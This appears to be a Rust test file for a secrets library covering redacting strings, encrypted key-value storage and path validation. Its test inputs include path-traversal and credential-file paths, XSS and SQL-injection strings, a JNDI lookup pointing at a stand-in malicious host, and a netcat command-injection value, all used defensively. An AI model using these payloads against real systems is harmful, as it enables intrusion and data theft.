use crate::secure_storage::SecureStorage;
use crate::secure_string::SecureString;
use crate::secure_path::SecurePath;
use std::fs;
use std::io::Write;
use tempfile::TempDir;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_secure_string_creation_and_access() {
        let sensitive_data = "super_secret_api_key_12345";
        let secure_str = SecureString::new(sensitive_data.to_string());
        
        // Should be able to access the data when needed
        secure_str.with_data(|data| {
            assert_eq!(data, sensitive_data, "Should access original data");
        });
        
        // Should redact in debug output
        let debug_output = format!("{:?}", secure_str);
        assert!(debug_output.contains("[REDACTED]"), "Debug output should be redacted");
        assert!(!debug_output.contains(sensitive_data), "Debug output should not contain sensitive data");
    }

    #[test]
    fn test_secure_string_comparison() {
        let data1 = "identical_secret";
        let data2 = "identical_secret";
        let data3 = "different_secret";
        
        let secure1 = SecureString::new(data1.to_string());
        let secure2 = SecureString::new(data2.to_string());
        let secure3 = SecureString::new(data3.to_string());
        
        // Should use constant-time comparison
        assert!(secure1.constant_time_eq(&secure2), "Identical strings should be equal");
        assert!(!secure1.constant_time_eq(&secure3), "Different strings should not be equal");
    }

    #[test]
    fn test_secure_string_memory_clearing() {
        let sensitive_data = "temporary_secret";
        let secure_str = SecureString::new(sensitive_data.to_string());
        
        // Create reference to verify memory clearing
        let ptr = {
            let mut temp_ptr = std::ptr::null();
            secure_str.with_data(|data| {
                temp_ptr = data.as_ptr();
            });
            temp_ptr
        };
        
        // Drop the SecureString
        drop(secure_str);
        
        // Note: In a real scenario, memory would be zeroed
        // This test mainly ensures the structure works correctly
        // Memory clearing verification would require unsafe code inspection
    }

    #[tokio::test]
    async fn test_secure_storage_initialization() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let storage_path = temp_dir.path().join("secure_storage.db");
        
        let storage = SecureStorage::new(storage_path.to_str().unwrap()).await;
        assert!(storage.is_ok(), "SecureStorage should initialize successfully");
        
        let storage = storage.unwrap();
        assert!(storage.is_initialized(), "Storage should be marked as initialized");
    }

    #[tokio::test]
    async fn test_secure_storage_store_and_retrieve() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let storage_path = temp_dir.path().join("test_storage.db");
        
        let mut storage = SecureStorage::new(storage_path.to_str().unwrap()).await.unwrap();
        
        let key = "api_key";
        let secret_value = "very_secret_api_key_value_12345";
        
        // Store the secret
        let store_result = storage.store(key, secret_value).await;
        assert!(store_result.is_ok(), "Should store secret successfully");
        
        // Retrieve the secret
        let retrieve_result = storage.retrieve(key).await;
        assert!(retrieve_result.is_ok(), "Should retrieve secret successfully");
        
        let retrieved_value = retrieve_result.unwrap();
        assert_eq!(retrieved_value, secret_value, "Retrieved value should match stored value");
    }

    #[tokio::test]
    async fn test_secure_storage_key_not_found() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let storage_path = temp_dir.path().join("empty_storage.db");
        
        let storage = SecureStorage::new(storage_path.to_str().unwrap()).await.unwrap();
        
        // Try to retrieve non-existent key
        let result = storage.retrieve("non_existent_key").await;
        assert!(result.is_err(), "Should return error for non-existent key");
        
        let error = result.unwrap_err();
        assert!(error.to_string().contains("not found") || error.to_string().contains("exist"),
               "Error should indicate key not found: {}", error);
    }

    #[tokio::test]
    async fn test_secure_storage_update_existing_key() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let storage_path = temp_dir.path().join("update_storage.db");
        
        let mut storage = SecureStorage::new(storage_path.to_str().unwrap()).await.unwrap();
        
        let key = "updateable_key";
        let initial_value = "initial_secret";
        let updated_value = "updated_secret";
        
        // Store initial value
        storage.store(key, initial_value).await.unwrap();
        
        // Update with new value
        storage.store(key, updated_value).await.unwrap();
        
        // Retrieve and verify updated value
        let retrieved = storage.retrieve(key).await.unwrap();
        assert_eq!(retrieved, updated_value, "Should retrieve updated value");
        assert_ne!(retrieved, initial_value, "Should not retrieve old value");
    }

    #[tokio::test]
    async fn test_secure_storage_delete_key() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let storage_path = temp_dir.path().join("delete_storage.db");
        
        let mut storage = SecureStorage::new(storage_path.to_str().unwrap()).await.unwrap();
        
        let key = "deleteable_key";
        let value = "secret_to_delete";
        
        // Store the value
        storage.store(key, value).await.unwrap();
        
        // Verify it exists
        assert!(storage.retrieve(key).await.is_ok(), "Key should exist before deletion");
        
        // Delete the key
        let delete_result = storage.delete(key).await;
        assert!(delete_result.is_ok(), "Should delete key successfully");
        
        // Verify it's gone
        let retrieve_result = storage.retrieve(key).await;
        assert!(retrieve_result.is_err(), "Key should not exist after deletion");
    }

    #[tokio::test]
    async fn test_secure_storage_encryption() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let storage_path = temp_dir.path().join("encrypted_storage.db");
        
        let mut storage = SecureStorage::new(storage_path.to_str().unwrap()).await.unwrap();
        
        let key = "encrypted_key";
        let sensitive_data = "highly_confidential_information";
        
        // Store encrypted data
        storage.store(key, sensitive_data).await.unwrap();
        
        // Read raw file content to verify encryption
        let raw_content = fs::read_to_string(&storage_path);
        
        match raw_content {
            Ok(content) => {
                // Verify that sensitive data is not stored in plaintext
                assert!(!content.contains(sensitive_data), 
                       "Sensitive data should not appear in plaintext in storage file");
            },
            Err(_) => {
                // Storage might be binary format, which is also acceptable
                // as long as data can be retrieved correctly
            }
        }
        
        // Verify data can still be retrieved correctly
        let retrieved = storage.retrieve(key).await.unwrap();
        assert_eq!(retrieved, sensitive_data, "Encrypted data should be retrievable");
    }

    #[test]
    fn test_secure_path_validation() {
        // Valid paths
        let valid_paths = vec![
            "config/settings.json",
            "data/prices.csv",
            "logs/app.log",
            "relative/path/to/file.txt",
        ];
        
        for path in valid_paths {
            let secure_path = SecurePath::new(path);
            assert!(secure_path.is_ok(), "Valid path '{}' should be accepted", path);
        }
    }

    #[test]
    fn test_secure_path_rejection() {
        // Invalid/dangerous paths
        let dangerous_paths = vec![
            ("../../../etc/passwd", "path traversal"),
            ("/absolute/path", "absolute path"),
            ("~/.ssh/private_key", "home directory"),
            ("C:\\Windows\\System32\\config", "Windows system path"),
            ("path/with/../traversal", "embedded traversal"),
        ];
        
        for (path, reason) in dangerous_paths {
            let secure_path = SecurePath::new(path);
            assert!(secure_path.is_err(), "Dangerous path '{}' should be rejected ({})", path, reason);
        }
    }

    #[test]
    fn test_secure_path_normalization() {
        let path_with_redundant_separators = "path//to///file.txt";
        let secure_path = SecurePath::new(path_with_redundant_separators);
        
        match secure_path {
            Ok(path) => {
                let normalized = path.as_str();
                // Should normalize path separators
                assert!(!normalized.contains("//"), "Should not contain double slashes");
                assert!(!normalized.contains("///"), "Should not contain triple slashes");
            },
            Err(_) => {
                // If normalization fails, that's also acceptable as a security measure
            }
        }
    }

    #[tokio::test]
    async fn test_secure_storage_concurrent_access() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let storage_path = temp_dir.path().join("concurrent_storage.db");
        
        let storage1 = SecureStorage::new(storage_path.to_str().unwrap()).await.unwrap();
        let storage2 = SecureStorage::new(storage_path.to_str().unwrap()).await.unwrap();
        
        // Test concurrent reads/writes
        let storage1_clone = storage1.clone();
        let storage2_clone = storage2.clone();
        
        let handle1 = tokio::spawn(async move {
            let mut storage = storage1_clone;
            for i in 0..10 {
                let key = format!("key_{}", i);
                let value = format!("value_{}", i);
                storage.store(&key, &value).await.unwrap();
            }
        });
        
        let handle2 = tokio::spawn(async move {
            let mut storage = storage2_clone;
            for i in 10..20 {
                let key = format!("key_{}", i);
                let value = format!("value_{}", i);
                storage.store(&key, &value).await.unwrap();
            }
        });
        
        // Wait for both operations to complete
        let (result1, result2) = tokio::join!(handle1, handle2);
        assert!(result1.is_ok(), "Concurrent operation 1 should succeed");
        assert!(result2.is_ok(), "Concurrent operation 2 should succeed");
        
        // Verify all data was stored correctly
        for i in 0..20 {
            let key = format!("key_{}", i);
            let expected_value = format!("value_{}", i);
            let retrieved = storage1.retrieve(&key).await.unwrap();
            assert_eq!(retrieved, expected_value, "Concurrent data should be consistent");
        }
    }

    #[test]
    fn test_memory_security_patterns() {
        // Test that security-sensitive operations don't leak information
        
        // Test 1: Secure comparison timing
        let secret1 = SecureString::new("secret_password_123".to_string());
        let secret2 = SecureString::new("secret_password_123".to_string());
        let different = SecureString::new("different_password".to_string());
        
        // Measure comparison times (should be constant for same-length strings)
        let start = std::time::Instant::now();
        let _result1 = secret1.constant_time_eq(&secret2);
        let time1 = start.elapsed();
        
        let start = std::time::Instant::now();
        let _result2 = secret1.constant_time_eq(&different);
        let time2 = start.elapsed();
        
        // Times should be similar (within reasonable variance)
        let time_diff = if time1 > time2 { time1 - time2 } else { time2 - time1 };
        assert!(time_diff < std::time::Duration::from_millis(1),
               "Comparison times should be constant-time");
    }

    #[test]
    fn test_input_sanitization() {
        // Test various injection attempts
        let injection_attempts = vec![
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "%3Cscript%3Ealert('xss')%3C/script%3E",
            "${jndi:ldap://malicious.com/exploit}",
            "{{7*7}}",  // Template injection
            "|nc -l 1234",  // Command injection
        ];
        
        for attempt in injection_attempts {
            // SecureString should handle malicious input safely
            let secure_input = SecureString::new(attempt.to_string());
            
            // Should not crash or execute anything
            secure_input.with_data(|data| {
                assert_eq!(data, attempt, "Should store data as-is without execution");
            });
            
            // Debug output should be redacted
            let debug_output = format!("{:?}", secure_input);
            assert!(debug_output.contains("[REDACTED]"), 
                   "Malicious input should be redacted in debug output");
        }
    }

    #[tokio::test]
    async fn test_secure_storage_file_permissions() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let storage_path = temp_dir.path().join("permissions_test.db");
        
        let _storage = SecureStorage::new(storage_path.to_str().unwrap()).await.unwrap();
        
        // Check that storage file has appropriate permissions (if created)
        if storage_path.exists() {
            let metadata = fs::metadata(&storage_path).unwrap();
            let permissions = metadata.permissions();
            
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let mode = permissions.mode();
                
                // Should not be world-readable (no read permission for others)
                assert_eq!(mode & 0o044, 0, "Storage file should not be world-readable");
                
                // Should be owner-readable and writable
                assert_ne!(mode & 0o600, 0, "Storage file should be owner-readable/writable");
            }
        }
    }

    #[test]
    fn test_sensitive_data_logging_prevention() {
        let api_key = SecureString::new("sk_live_very_secret_key_12345".to_string());
        let api_secret = SecureString::new("secret_abcdef123456789".to_string());
        
        // Simulate logging scenarios
        let log_message = format!("API credentials: key={:?}, secret={:?}", api_key, api_secret);
        
        // Verify no sensitive data leaks in logs
        assert!(log_message.contains("[REDACTED]"), "Log should contain redacted placeholders");
        assert!(!log_message.contains("sk_live_very_secret_key_12345"), 
               "Log should not contain actual API key");
        assert!(!log_message.contains("secret_abcdef123456789"), 
               "Log should not contain actual secret");
        
        // Test serialization prevention
        let serialization_attempt = serde_json::to_string(&api_key);
        match serialization_attempt {
            Ok(json) => {
                assert!(json.contains("REDACTED") || json.contains("null"), 
                       "JSON serialization should be redacted or disabled");
                assert!(!json.contains("sk_live_very_secret_key_12345"), 
                       "JSON should not contain sensitive data");
            },
            Err(_) => {
                // Serialization disabled is also acceptable
            }
        }
    }

    #[tokio::test]
    async fn test_secure_storage_backup_and_recovery() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let storage_path = temp_dir.path().join("backup_test.db");
        
        let mut storage = SecureStorage::new(storage_path.to_str().unwrap()).await.unwrap();
        
        // Store some test data
        let test_data = vec![
            ("key1", "secret1"),
            ("key2", "secret2"),
            ("key3", "secret3"),
        ];
        
        for (key, value) in &test_data {
            storage.store(key, value).await.unwrap();
        }
        
        // Create backup (if supported)
        let backup_result = storage.create_backup().await;
        
        match backup_result {
            Ok(backup_path) => {
                // Backup should exist and be readable
                assert!(backup_path.exists(), "Backup file should exist");
                
                // Original data should still be accessible
                for (key, expected_value) in &test_data {
                    let retrieved = storage.retrieve(key).await.unwrap();
                    assert_eq!(retrieved, *expected_value, "Original data should be intact");
                }
                
                // Test recovery from backup (if supported)
                let recovery_result = storage.restore_from_backup(&backup_path).await;
                
                if recovery_result.is_ok() {
                    // Verify data after recovery
                    for (key, expected_value) in &test_data {
                        let retrieved = storage.retrieve(key).await.unwrap();
                        assert_eq!(retrieved, *expected_value, "Recovered data should match");
                    }
                }
            },
            Err(_) => {
                // Backup functionality might not be implemented yet
                println!("Backup functionality not available");
            }
        }
    }
}